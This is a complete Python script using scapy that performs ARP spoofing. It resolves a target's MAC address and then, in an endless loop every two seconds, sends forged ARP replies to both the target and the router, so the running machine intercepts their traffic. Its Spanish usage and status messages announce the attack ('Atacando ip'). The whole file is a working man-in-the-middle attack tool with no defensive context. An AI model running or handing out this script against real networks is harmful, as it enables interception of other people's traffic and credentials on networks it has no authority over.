# Author: Axel Avila
import scapy.all as scapy
import sys
import time

##################################
# Functions
#################################

def retrieve_mac(target_ip):
    # Get mac address.
    arp = scapy.ARP(pdst = target_ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp

    # Send packet.
    answered_list = scapy.srp(packet, timeout = 5, verbose = False)
    return answered_list[0][0][1].hwsrc

def spoof(target_ip, spoof_ip):
    mac = retrieve_mac(target_ip)
    packet = scapy.ARP(
            op = 2,
            pdst = target_ip,
            hwdst = mac,
            psrc = spoof_ip
    )
    scapy.send(packet, verbose = False)

#################################
##      Program
#################################

# Check args
ips = sys.argv
if len(ips) != 3:
    print("Ingresa una ip objetivo y la ip del router de la siguiente forma: python3 spoofer.py OBJETIVO ROUTER")
    exit(1)

# Get ips
target_ip = ips[1]
router_ip = ips[2]
print("Atacando ip: ", target_ip)

counter = 0
while True:
    spoof(target_ip, router_ip)
    spoof(router_ip, target_ip)
    counter = counter + 2
    print("Paquetes envìados " + str(counter))
    time.sleep(2)